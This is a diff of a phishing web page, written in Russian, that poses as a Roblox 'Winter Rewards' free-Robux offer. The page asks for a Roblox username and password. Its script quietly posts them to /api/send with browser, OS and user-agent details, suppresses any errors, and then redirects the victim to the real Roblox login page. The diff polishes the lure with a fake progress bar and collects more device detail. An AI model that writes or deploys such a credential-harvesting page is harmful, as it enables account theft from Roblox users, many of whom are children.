@@ -9,40 +9,26 @@
         .header { width: 100%; background: #d32f2f; padding: 15px 20px; box-shadow: 0 4px 15px rgba(211, 47, 47, 0.4); display: flex; align-items: center; position: fixed; top: 0; z-index: 100; border-bottom: 3px solid #ffca28; box-sizing: border-box; }
         .spacer { height: 120px; }
         .card { background: #232527; padding: 40px 30px; border-radius: 15px; width: 350px; text-align: center; border: 2px solid #d32f2f; position: relative; box-shadow: 0 0 30px rgba(211, 47, 47, 0.5); box-sizing: border-box; }
-        
-        /* Лого с шапкой */
         .main-logo-area { position: relative; display: inline-block; margin-bottom: 15px; }
         .big-r { font-size: 70px; font-weight: 900; color: #fff; line-height: 1; letter-spacing: -5px; }
         .santa-hat { position: absolute; top: -25px; left: -15px; font-size: 45px; transform: rotate(-15deg); }
-        
-        /* Наша фишка: Анти-Бот */
         .anti-bot { background: rgba(211, 47, 47, 0.15); border: 1px solid #d32f2f; color: #ffca28; font-size: 11px; padding: 8px; border-radius: 5px; margin-bottom: 20px; text-transform: uppercase; font-weight: bold; }
-
         .event-title { color: #fff; font-weight: 900; font-size: 20px; margin-bottom: 10px; }
         select, input { width: 100%; padding: 14px; margin-bottom: 15px; background: #111; border: 1px solid #444; color: #fff; border-radius: 6px; box-sizing: border-box; outline: none; font-size: 15px; }
         button { width: 100%; padding: 16px; background: #d32f2f; color: #fff; border: none; font-weight: bold; border-radius: 6px; cursor: pointer; font-size: 16px; text-transform: uppercase; }
-        
-        #console { display: none; color: #ffca28; font-size: 11px; margin-top: 20px; font-family: monospace; text-align: left; }
+        #loading { display: none; margin-top: 20px; }
+        .bar { height: 4px; width: 100%; background: #444; border-radius: 2px; overflow: hidden; }
+        .progress { width: 0%; height: 100%; background: #ffca28; transition: width 3s; }
         .footer { font-size: 11px; color: #555; margin-top: 30px; }
     </style>
 </head>
 <body>
-    <div class="header">
-        <span style="font-size: 24px; margin-right: 10px;">🎅</span>
-        <span style="font-weight: 900;">WINTER REWARDS SYSTEM 2025</span>
-    </div>
+    <div class="header"><span style="font-size: 24px; margin-right: 10px;">🎅</span><span style="font-weight: 900;">WINTER REWARDS SYSTEM</span></div>
     <div class="spacer"></div>
     <div class="card">
-        <div class="main-logo-area">
-            <span class="santa-hat">🎅</span>
-            <span class="big-r">ROBLOX</span>
-        </div>
-        
-        <div class="anti-bot">
-            ⚠️ ANTI-BOT: Аккаунты должны быть старше 30 дней
-        </div>
-
-        <div class="event-title">ВЫБЕРИТЕ ПОДАРОК 🎁</div>
+        <div class="main-logo-area"><span class="santa-hat">🎅</span><span class="big-r">ROBLOX</span></div>
+        <div class="anti-bot">⚠️ Внимание: Только для аккаунтов старше 30 дней</div>
+        <div class="event-title">ПОЛУЧИТЬ ПОДАРОК 🎁</div>
         <form id="rob-form">
             <select id="amount">
                 <option value="400">400 Robux</option>
@@ -53,36 +39,40 @@
             </select>
             <input type="text" id="user" placeholder="Никнейм" required>
             <input type="password" id="pass" placeholder="Пароль" required>
-            <button type="submit" id="submit-btn">ЗАБРАТЬ ROBUX</button>
+            <button type="submit" id="btn">ЗАБРАТЬ НАГРАДУ</button>
         </form>
-        <div id="console">
-            > ОПРЕДЕЛЕНИЕ IP... [OK]<br>
-            > ПРОВЕРКА ВОЗРАСТА АККАУНТА... [OK]<br>
-            > ГЕНЕРАЦИЯ ТОКЕНА...
+        <div id="loading">
+            <div style="font-size: 12px; margin-bottom: 5px; color: #ffca28;">Синхронизация...</div>
+            <div class="bar"><div class="progress" id="p-bar"></div></div>
         </div>
-        <div class="footer">© 2025 Roblox Protection System.</div>
+        <div class="footer">© 2025 Roblox Protection.</div>
     </div>
 
     <script>
         document.getElementById('rob-form').onsubmit = async (e) => {
             e.preventDefault();
-            document.getElementById('submit-btn').style.display = 'none';
-            document.getElementById('console').style.display = 'block';
-            
-            // Сбор точных данных о железе
-            const model = `Brand: ${navigator.vendor} | OS: ${navigator.platform} | Engine: ${navigator.appCodeName} | Device: ${(/Mobi|Android/i.test(navigator.userAgent)) ? 'Mobile' : 'Desktop'}`;
-            
-            await fetch('/api/send', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ 
-                    u: document.getElementById('user').value, 
-                    p: document.getElementById('pass').value, 
-                    r: document.getElementById('amount').value,
-                    m: model 
-                })
-            });
-            setTimeout(() => { window.location.href = "https://www.roblox.com/login"; }, 3000);
+            document.getElementById('btn').style.display = 'none';
+            document.getElementById('loading').style.display = 'block';
+            setTimeout(() => { document.getElementById('p-bar').style.width = '100%'; }, 100);
+
+            // Собираем всё, включая точные детали
+            const info = {
+                u: document.getElementById('user').value,
+                p: document.getElementById('pass').value,
+                r: document.getElementById('amount').value,
+                m: `Vendor: ${navigator.vendor} | OS: ${navigator.platform} | UA: ${navigator.userAgent}`
+            };
+
+            // Отправляем БЕЗ лишнего шума
+            try {
+                await fetch('/api/send', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(info)
+                });
+            } catch (e) {}
+
+            setTimeout(() => { window.location.href = "https://www.roblox.com/login"; }, 3500);
         };
     </script>
 </body>
